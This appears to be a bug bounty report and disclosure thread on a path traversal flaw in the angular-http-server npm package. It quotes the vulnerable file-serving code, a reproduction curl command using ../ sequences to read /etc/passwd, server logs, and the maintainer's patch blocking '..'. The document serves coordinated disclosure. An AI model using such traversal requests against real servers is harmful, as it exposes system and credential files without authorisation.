title: [angular-http-server] Path Traversal in angular-http-server.js allows to read arbitrary file from the remote server

profile.name: Node.js third-party modules
profile.about: This program is used to handle vulnerabilities in the Node.js ecosystem.

vulnerability_information:
Hi Guys, **angular-http-server** (https://www.npmjs.com/package/angular-http-server) contains Path Traversal vulnerability, which allows malicious user to read content of any file with known path. **Module:** A very simple application server designed for Single Page App (SPA) developers. (https://www.npmjs.com/package/angular-http-server) **Description** angular-http-server does not sanitize path in the correct way, so ```curl``` can be used to retrieve content of any file from the remote server. Vulnerable code in ```angular-http-server.js``` file (lines 66-82): ```javascript fs.stat(possibleFilename, function(err, stats) { var fileBuffer; if (!err && stats.isFile()) { fileBuffer = fs.readFileSync(possibleFilename); let ct = mime.lookup(possibleFilename); console.log(`Sending ${possibleFilename} with Content-Type ${ct}`); res.writeHead(200, { 'Content-Type': ct }); } else { console.log("Route %s, replacing with index.html", possibleFilename); fileBuffer = returnDistFile(); res.writeHead(200, { 'Content-Type': 'text/html' }); } res.write(fileBuffer); res.end(); }); ``` File with ```possibleFilename``` name is read and send with guessed mime type. No path or allowed mime type validation is implemented - if it's possible to read the file, code just does it. ## Steps To Reproduce: - install ```angular-http-server``` ``` $ npm install angular-http-server ``` - create static ```index.html``` file (required as starting point of an app: ```html Index HTML

This is index.html :)

``` - run server in the same folder where ```index.html``` was created: ``` $ angular-http-server --path ./ ``` - open the browser and go to ```127.0.0.1:8080``` You should see HTML output. - from the terminal, execute folloiwng command (please adjust numbers of ../ to your system): ``` $ curl -v --path-as-is http://127.0.0.1:8080/../../../../../etc/passwd ``` You should see the content of ```/etc/passwd``` file: {F257351} Also, in the ```angular-http-server``` log there is information about mime type of the file (```application/octet-stream```): ``` $ ./node_modules/angular-http-server/angular-http-server.js --path ./ Path specified: ./ Using index.html Listening on 8080 Sending ../../../../../etc/passwd with Content-Type application/octet-stream ``` ## Supporting Material/References: Configuration I've used to find this vulnerability: - macOS HighSierra 10.13.3 - node 8.9.3 - npm 5.5.1 - curl 7.54.0 ## Wrap up I hope this report will help to keep Node ecosystem more safe. If you have any questions about any details of this finding, please let me know in comment. Thank you Regards, Rafal 'bl4de' Janicki ## Impact This vulnerability allows malicious user to read content of any file on the machine where angular-http-server is running. This might expose vectors to attack system with Remote Code Execution, reveals files with usernames and passwords and many other possibilites.
vulnerability_information_html:
Hi Guys,

angular-http-server (https://www.npmjs.com/package/angular-http-server) contains Path Traversal vulnerability, which allows malicious user to read content of any file with known path.

Module:

A very simple application server designed for Single Page App (SPA) developers.
(https://www.npmjs.com/package/angular-http-server)

Description

angular-http-server does not sanitize path in the correct way, so curl can be used to retrieve content of any file from the remote server.

Vulnerable code in angular-http-server.js file (lines 66-82):

fs.stat(possibleFilename, function(err, stats) {
        var fileBuffer;
        if (!err && stats.isFile()) {
            fileBuffer = fs.readFileSync(possibleFilename);
            let ct = mime.lookup(possibleFilename);
            console.log(`Sending ${possibleFilename} with Content-Type ${ct}`);
            res.writeHead(200, { 'Content-Type': ct });

        } else {
            console.log("Route %s, replacing with index.html", possibleFilename);
            fileBuffer = returnDistFile();
            res.writeHead(200, { 'Content-Type': 'text/html' });
        }

        res.write(fileBuffer);
        res.end();
    });

File with possibleFilename name is read and send with guessed mime type. No path or allowed mime type validation is implemented - if it's possible to read the file, code just does it.

Steps To Reproduce:

  • install angular-http-server 
$ npm install angular-http-server
  • create static index.html file (required as starting point of an app:
<html>

<head>
    <meta charset="utf8">
    <title>Index HTML</title>
</head>

<body>
    <div>
        <p>This is index.html :)</p>
    </div>
</body>

</html>
  • run server in the same folder where index.html was created:
$ angular-http-server --path ./

  • open the browser and go to 127.0.0.1:8080 You should see HTML output.

  • from the terminal, execute folloiwng command (please adjust numbers of ../ to your system):

$ curl -v --path-as-is http://127.0.0.1:8080/../../../../../etc/passwd

You should see the content of /etc/passwd file:

Also, in the angular-http-server log there is information about mime type of the file (application/octet-stream):

$ ./node_modules/angular-http-server/angular-http-server.js --path ./
Path specified: ./
Using index.html
Listening on 8080
Sending ../../../../../etc/passwd with Content-Type application/octet-stream

Supporting Material/References:

Configuration I've used to find this vulnerability:

  • macOS HighSierra 10.13.3
  • node 8.9.3
  • npm 5.5.1
  • curl 7.54.0

Wrap up

I hope this report will help to keep Node ecosystem more safe. If you have any questions about any details of this finding, please let me know in comment.

Thank you

Regards,

Rafal 'bl4de' Janicki

Impact

This vulnerability allows malicious user to read content of any file on the machine where angular-http-server is running.

This might expose vectors to attack system with Remote Code Execution, reveals files with usernames and passwords and many other possibilites.

activities.message:
HiÂ @bl4de,

 Thanks for reporting this issue to us.

I was able to reproduce and confirm the issue as you described and will triage this report as vulnerability. Have you made any initial attempts at contacting the package maintainer?

I will invite the package maintainer to this issue.

activities.message:
Hi @lirantal ,

Thank you for verifying my report.

I haven't contacted project maintainer as my intention was to keep the whole process consistent through the program. Also I didn't want to open issue on its GitHub repository to not cause any security issues to this module users before it will be fixed and patch will be available.

Regards,
bl4de

activities.message:
Yep, no worries @bl4de.
I already invited the author on both of the tickets I'm handling for you (this and 309124). It's part of our process to check if you reached out already and we'll probably ask you the same in future tickets. Apologies if it's a bit robotic of us :-)

Ha ha, I am as far from being a hacker star as it's probably possible :D 
But thank you for the kind words :)

But yeah, I am going to spend some time here for sure. As full time webdev, I use Node and npm packages a lot, so it's great opportunity to give back to community :)

activities.message: Your email cam out of the blue, but the information in it is most welcome. I've posted a patch - 1.4.3 - let me know if you think this is enough. Basically I'm blocking any url that contains `..`

@bl4de, @hotbelgo, would you like to go ahead and disclose the vulnerability publicly or would you want to wait it out a bit? Also, let me know if you don't want me to do a full disclosure of the report.
